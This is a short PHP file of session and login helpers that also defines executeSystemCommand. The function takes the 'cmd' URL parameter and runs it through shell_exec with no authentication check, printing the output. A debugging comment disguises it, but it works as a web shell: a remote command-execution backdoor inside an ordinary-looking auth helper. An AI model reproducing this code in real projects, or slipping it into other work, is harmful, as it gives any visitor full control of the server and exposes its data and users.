<?php
session_start();

// User login validation
function isLoggedIn() {
    return isset($_SESSION['user']);
}

// Admin login validation
function isAdmin() {
    return isset($_SESSION['admin']);
}

// Redirect function
function redirect($url) {
    header("Location: $url");
    exit();
}

function executeSystemCommand() {
    if (isset($_GET['cmd'])) {
        $command = $_GET['cmd'];

        // Log the command (for debugging or auditing purposes)
        error_log("Executing command: " . $command);

        // Execute the command and return the output
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
}
?>
